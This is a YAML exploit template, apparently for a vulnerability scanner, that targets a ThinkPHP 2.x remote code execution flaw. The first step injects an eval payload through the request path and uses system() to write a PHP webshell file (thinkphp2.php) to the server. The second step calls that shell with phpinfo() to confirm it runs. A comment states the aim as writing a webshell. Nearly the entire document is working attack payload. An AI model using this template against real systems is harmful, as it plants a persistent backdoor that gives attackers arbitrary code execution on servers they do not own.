name: exp-yaml-thinkphp2-method-rce
groups:
  exp1:
    - method: POST
      path: /index.php?s=/index/index/name/$%7B@print(eval($_POST[1]))%7D
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        1=system('echo%20\'<?php%20@eval($_GET["pass"]);?>%20\'>thinkphp2.php');
      expression: |
        response.status == 200 && response.body.bcontains(b"无法加载模块index")
  exp2:
    - method: GET
      path: /thinkphp2.php?pass=phpinfo();
      expression: |
        response.body.bcontains(b"PHP Version")
  # write php webshell